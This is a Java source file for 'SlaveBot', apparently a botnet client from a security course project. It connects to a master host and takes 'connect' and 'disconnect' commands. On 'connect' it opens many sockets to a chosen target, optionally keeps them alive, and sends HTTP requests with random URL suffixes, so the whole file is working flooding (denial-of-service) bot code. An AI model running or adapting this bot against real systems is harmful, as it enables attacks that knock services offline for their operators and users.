

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.util.ArrayList;
import java.util.Random;
import java.util.Scanner;

import javax.swing.SingleSelectionModel;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;

@SuppressWarnings("unused")
public class SlaveBot {
    public static void main(String[] args) throws IOException {
	
        
        int portNumber=80;
        int length = args.length;
        String ipaddress="localhost";
       
	
	if(length==4)
	{
	for (int q=0; q< length;q++)
	{
		if(args[q].equals("p"))
		{
			
			portNumber=Integer.parseInt(args[q+1]);
			
		}else if(args[q].equals("h"))
		{
			ipaddress=args[q+1];
			
			
			
		}
		
	}
	}else
	{
	    
		System.exit(-1);
	}
        ArrayList<serinfo> serconncns;
        BufferedReader bufferedReader;

        serconncns  = new ArrayList<serinfo>();
     
        Socket socket = null;
        try {
           // socket = new Socket(ipaddress, portNumber);
            
           // bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            String sercmnd;
            while (true) {
        	socket = new Socket(ipaddress, portNumber);
        	 bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
     
                sercmnd = bufferedReader.readLine();
                if (sercmnd == null)
                    continue;
                String partcmd[] = sercmnd.split(" ");
       String iporhost;
                int serports;
                int attacknumber=0;
              //  String alive;
                String slavename=partcmd[1];
                if(slavename.equals("localhost")||slavename.equals("127.0.0.1")||slavename.equals("all"))       
                {
                   
                }
                else
                {
                  
                    System.exit(-1);
                }
                
                String browserinput;
               
                switch (partcmd[0]) {
                case "connect":
                    String alive="";
                    serports = Integer.parseInt(partcmd[3]);
                    iporhost = partcmd[2];
                    
                    if(partcmd.length==4)
                    {	attacknumber=1;
                   
                    
                    }
                   
                    else if(partcmd.length==5)
                    {
                	if(partcmd[4].equals("keepalive"))
                	{
                	    attacknumber=1;
                	    alive="keepalive";
                	}
                	if((partcmd[4].substring(0, 4)).equals("url="))
{
    
                	    attacknumber=1;
                	    alive=partcmd[4];
    }
                	
                    }
                    else
                        attacknumber = Integer.parseInt(partcmd[4]);
                        
                    
                    
                	
                    
                   if(partcmd.length==6)
                   {
                       if(partcmd[4].equals("keepalive")&&(partcmd[5].substring(0, 4).equals("url=")))
                       { alive =partcmd[5];
                       attacknumber=1;
                       }
                       else
                	  
                	   {alive=partcmd[5];
                	   attacknumber=Integer.parseInt(partcmd[4]);
                	   }
                	   }
                   
                
                   if(partcmd.length==7)
                   {
                       
                       alive=partcmd[6];
                   }
                   
                  
                    for (int index = 0; index < attacknumber; index++) {
                	
			Socket new_socket = new Socket(iporhost, serports);

			serinfo serinfo = new serinfo(iporhost, serports, new_socket);
			serconncns.add(serinfo);
			BufferedReader infromserver = new BufferedReader(
				new InputStreamReader(new_socket.getInputStream()));
			if (alive.equals("keepalive")||partcmd.length==7)
			    new_socket.setKeepAlive(true);

			
			InetAddress a = new_socket.getInetAddress();
			
			if(partcmd.length>5)
			{
			    if(alive.length()>4)
			    {
			if (alive.substring(0, 4).equals("url=")) {

			    
			   
			       String url = "http://" + iporhost.substring(4) + alive.substring(4) + randomString();
			       
			    // URL A=new
			    // URL("https://in.news.yahoo.com/5-indian-origin-candidates-clinched-100707841.html");
			    URL A = new URL(url);

			    HttpURLConnection k = (HttpURLConnection) A.openConnection();
			    k.connect();
			    htmlResponse(A);

			   
			    InputStream h = k.getInputStream();
			    
			  
			}
			else if(alive.equals("keepalive"))
			{
			  
			}
			else
			{
			    System.exit(-1);
			}
			    }
			    else
			    {
				System.exit(-1);
			    }
			}
			
			
		    }

		    continue;
		case "disconnect":
		    iporhost = partcmd[2];
		    ArrayList<serinfo> removeconn = new ArrayList<serinfo>();
		    if (partcmd.length == 3) {
			

			for (serinfo serinfo : serconncns) {
			 
			    if (iporhost.equals(serinfo.getHostname())) {
				
				serinfo.getSocket().close();
				removeconn.add(serinfo);
				
				
			    }
			}
			for (serinfo serinfo : removeconn) {
			    serconncns.remove(serinfo);
			}
		    } else {
			
			    
			serports = Integer.parseInt(partcmd[3]);
			
			
			for (serinfo serinfo : serconncns) {
			   
			    if (iporhost.equals(serinfo.getHostname()) && serports==serinfo.getPortNumber()) {
								 
				serinfo.getSocket().close();
				removeconn.add(serinfo);
				
				
			    }
			}
			for (serinfo serinfo : removeconn) {
			    serconncns.remove(serinfo);
			}

		    }
		    continue;

		default:
		    continue;
		}
	    }
	} catch (IOException e) {
	    System.exit(-1);
	   // e.printStackTrace();
	    socket.close();
	}
    }
    public static String randomString()
    {
    	String alphabet= "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    	Random rad=new Random();
    	int num=rad.nextInt(10)+1;
    	String randStr="";
    	for(int i=0;i<num;i++)
    	{
    		char c=alphabet.charAt(rad.nextInt(52));
    		randStr=randStr+c;
    	}
    	return randStr;
    }

public static void htmlResponse(URL urlRes)throws IOException
	{
		try{
		Scanner s=new Scanner(urlRes.openStream());
		while(s.hasNext())
		{
		    s.nextLine();
		    
		}
		s.close();
		}
		catch(IOException e){
			System.exit(-1);
		}
	}
}

class serinfo {
    private String hname;
    private int pNumber;
    private Socket soc;

    public serinfo(String hostname, int portNumber, Socket socket) {
	this.soc = socket;
	this.hname = hostname;
	this.pNumber = portNumber;

    }

    public void setSocket(Socket socket) {
	this.soc = socket;
    }

    public Socket getSocket() {
	return soc;
    }

    public void setHostname(String hostname) {
	this.hname = hostname;
    }

    public String getHostname() {
	return hname;
    }

    public int getPortNumber() {
	return pNumber;
    }

    public void setPortNumber(int portNumb) {
	this.pNumber = portNumb;
    }

}
// hell